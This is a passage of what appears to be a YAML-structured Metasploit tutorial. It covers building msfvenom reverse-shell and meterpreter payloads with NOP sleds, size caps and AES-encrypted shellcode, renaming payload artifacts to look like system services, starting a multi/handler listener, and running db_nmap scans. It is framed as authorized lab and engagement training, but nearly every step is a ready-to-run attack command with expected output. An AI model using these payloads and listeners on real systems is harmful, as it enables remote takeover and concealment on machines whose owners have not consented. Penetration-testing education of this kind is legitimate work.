            cause: "Typo'd payload path."
            fix: "Confirm the exact path with `msfvenom --list payloads` (or `msfvenom --list payloads | grep meterpreter`)."
            check: "Re-run with the exact listed path."
      - step_id: mvd2
        title: "Control payload size and add a NOP sled"
        slot_target: ACTION_OPTIONS
        destructive: true
        recovery: "This still generates a real payload's bytes — authorized lab/engagement only. Size limits and NOP sleds are shaping techniques, NOT antivirus evasion; don't rely on them for that."
        glossary_refs: [nopsled]
        explanation:
          what: "`-s <bytes>` caps the total payload size (the build fails if it would be bigger); `--encoder-space <bytes>` caps just the ENCODED portion (defaults to the -s value). `-n <bytes>` prepends a NOP sled of that many no-op instructions; `--pad-nops` changes -n's meaning to 'pad the NOP sled until the TOTAL is exactly this size' instead of 'add this many extra bytes'."
          why: "A NOP sled gives an imprecise jump/return address room to 'slide' into your shellcode instead of landing a few bytes off and crashing — a classic exploit-development technique. Size limits matter when you're injecting into a fixed-size buffer (e.g. a vulnerable function's stack space) that can't hold an arbitrarily large payload."
          where: "ACTION_OPTIONS."
        find_it: "-s/--encoder-space: the buffer size limit from your target analysis, if any. -n: start small (16-32 bytes) — a NOP sled is a shaping technique, not something that needs to be huge."
        command_anatomy:
          - {token: "msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444", does: "the payload as usual"}
          - {token: "-n 16", does: "prepend a 16-byte NOP sled"}
          - {token: "-s 500", does: "fail the build if the result exceeds 500 bytes"}
          - {token: "-f raw -o payload.bin", does: "output as usual"}
        try_this: "msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -n 16 -s 500 -f raw -o payload.bin"
        success_criteria: "The reported payload size includes the NOP sled, and the build succeeds only if it fits within -s."
        expected_output: |
          Found 1 compatible encoders
          Payload size: 90 bytes
          Final size of raw file: 106 bytes
          Saved as: payload.bin
        alternatives:
          - trigger: "'The payload has exceeded the allowed space' or similar size error"
            cause: "The payload (plus any NOP sled/encoding) is bigger than -s allowed."
            fix: "Raise -s, drop the NOP sled, or pick a smaller payload (a stageless payload is often smaller than a full meterpreter)."
            check: "Re-run with a larger -s or a smaller payload/nopsled."
      - step_id: mvd3
        title: "Encrypt the shellcode itself"
        slot_target: ACTION_OPTIONS
        destructive: true
        recovery: "A generated payload is real malware on disk — authorized lab/engagement only. Encryption here is separate from AV evasion; don't treat it as reliable evasion either."
        glossary_refs: [shellcode_encryption]
        explanation:
          what: "`--encrypt <type>` wraps the raw shellcode in aes256/rc4/xor/base64 (use `--list encrypt` to see all); `--encrypt-key`/`--encrypt-iv` supply the key/initialization-vector some of those types need. This is different from `-e`/--encoder, which reshapes the payload to dodge bad characters — --encrypt genuinely encrypts the bytes."
          why: "A landing stub (loaded separately, or generated with the same options) decrypts the payload at runtime — this keeps the shellcode's real bytes out of a static file scan, though modern EDR still watches the DECRYPTION happening at runtime."
          where: "ACTION_OPTIONS."
        find_it: "`msfvenom --list encrypt` to see the exact type names. A key/IV of your choosing for aes256/rc4 — leave blank and msfvenom generates one for you (printed in its output, save it if you need to decrypt matching output elsewhere)."
        command_anatomy:
          - {token: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444", does: "the payload as usual"}
          - {token: "--encrypt aes256", does: "encrypt the shellcode with AES-256"}
          - {token: "-f raw -o payload.enc", does: "output as usual"}
        try_this: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 --encrypt aes256 -f raw -o payload.enc"
        success_criteria: "msfvenom prints the encryption key/IV it used (if you didn't supply one) alongside the saved file."
        expected_output: |
          [*] Encrypting the payload with AES256 encryption...
          [*] Encryption Key: 8f14e45fceea167a5a36dedd4bea2543...
          [*] Encryption IV: e4bd80a49b91f8ac...
          Saved as: payload.enc
        alternatives:
          - trigger: "'Encryption type is not supported' / unknown type"
            cause: "Typo'd encryption type."
            fix: "Confirm exact names with `msfvenom --list encrypt`."
            check: "Re-run with a listed type."
      - step_id: mvd4
        title: "Rename output artifacts to blend in"
        slot_target: ACTION_OPTIONS
        destructive: true
        recovery: "Still produces a real payload artifact — authorized lab/engagement only. Renaming is cosmetic, not evasion; AV/EDR inspects behaviour and byte signatures, not section/variable/service names."
        explanation:
          what: "`--service-name <name>` sets the Windows service name for service-executable formats (`-f exe-service`); `--sec-name <name>` sets the PE section name used when generating large Windows binaries (default: a random 4-character string); `-v/--var-name <name>` sets the variable name used in source-code output formats (`-f c`, `-f python`, `-f powershell`, etc.)."
          why: "A payload named 'msfvenom_payload' or a service literally called 'Meterpreter' is an obvious tell in Task Manager / Services / decompiled source — these flags exist purely to make generated artifacts look less like a generator's default output while you're learning to recognise this class of technique defensively."
          where: "ACTION_OPTIONS."
        find_it: "Pick names that resemble legitimate system components ONLY in an authorized lab context — this is taught for recognition/defence, not for use against real third-party systems."
        command_anatomy:
          - {token: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444", does: "the payload as usual"}
          - {token: "--service-name UpdaterSvc", does: "the Windows service name (service-executable formats only)"}
          - {token: "-f exe-service -o svc.exe", does: "the matching output format + file"}
        try_this: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 --service-name UpdaterSvc -f exe-service -o svc.exe"
        success_criteria: "svc.exe is written; when installed as a service in a lab, it shows the chosen name instead of a default."
        expected_output: |
          Payload size: 510 bytes
          Saved as: svc.exe
        alternatives:
          - trigger: "--service-name seems to have no effect"
            cause: "It only applies to service-executable formats (e.g. `-f exe-service`, `-f exe-small` variants) — plain `-f exe` ignores it."
            fix: "Switch Format to a service-executable variant, or use --sec-name/-v instead if you're not building a service binary."
            check: "Confirm the output format actually supports a service name."

  - flow_id: handler
    title: "multi/handler (catch the callback) (reference)"
    goal: "Listen for a reverse payload."
    command_builder_id: msfconsole
    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS]
    steps:
      - step_id: ms9
        title: "Set up the listener"
        slot_target: ACTION_OPTIONS
        glossary_refs: [handler, job]
        explanation:
          what: "`use exploit/multi/handler`, `set PAYLOAD <same as msfvenom>`, `set LHOST`, `set LPORT`, `exploit -j` (background)."
          why: "A reverse payload needs a matching listener to connect back to."
          where: "ACTION_OPTIONS (-x script)."
        find_it: "Use the EXACT payload, LHOST and LPORT you gave msfvenom — they must match."
        command_anatomy:
          - {token: "use exploit/multi/handler", does: "the generic listener module"}
          - {token: "set PAYLOAD .../reverse_tcp", does: "must match the payload you generated"}
          - {token: "set LHOST/LPORT", does: "must match msfvenom's values"}
          - {token: "exploit -j", does: "start the listener as a background job"}
        try_this: "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.5; set LPORT 4444; exploit -j\""
        success_criteria: "The listener starts as a background job."
        expected_output: |
          [*] Started reverse TCP handler on 10.0.0.5:4444
        alternatives:
          - trigger: "no callback"
            cause: "Payload LHOST/LPORT don't match the handler, or routing/firewall blocks it."
            fix: "Make payload and handler LHOST/LPORT identical; check routing/firewall."
            check: "Compare msfvenom LHOST/LPORT to the handler."
          - trigger: "'Address already in use' / handler fails to bind"
            cause: "A job from an earlier session (or a crashed terminal) is already bound to that LPORT — see the 'Already set up or running?' flow."
            fix: "`jobs -l` to find the stale job holding the port, `jobs -k <id>` to free it, then retry; or pick a different LPORT."
            check: "`jobs -l` no longer shows a listener on that port, or the new handler uses a free one."
  - flow_id: workflow_db
    title: "Workflow aids (reference)"
    goal: "Organize an engagement in the DB."
    command_builder_id: msfconsole
    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS]
    steps:
      - step_id: ms10
        title: "workspaces, db_nmap, hosts/services"
        slot_target: ACTION_OPTIONS
        glossary_refs: [workspace, datastore]
        explanation:
          what: "`workspace -a <name>` isolates engagements; `db_nmap <args>` scans+stores; `db_import <xml>`; review with hosts/services/vulns/creds/loot; automate with resource <file.rc> / makerc."
          why: "Keeps findings organized and repeatable."
          where: "ACTION_OPTIONS (-x script)."
        find_it: "A workspace name and a target range; requires the DB connected (setup flow)."
        command_anatomy:
          - {token: "workspace -a lab", does: "create/switch to a 'lab' workspace"}
          - {token: "db_nmap -sV 10.0.0.0/24", does: "run nmap and store results in the DB"}
          - {token: "hosts; services", does: "review discovered hosts and services"}
        try_this: "msfconsole -q -x \"workspace -a lab; db_nmap -sV 10.0.0.0/24; hosts; services\""
        success_criteria: "Scan results are stored and listed by hosts/services."
        expected_output: |
          Hosts
          address     os_name    name
          10.0.0.20   Linux      metasploitable
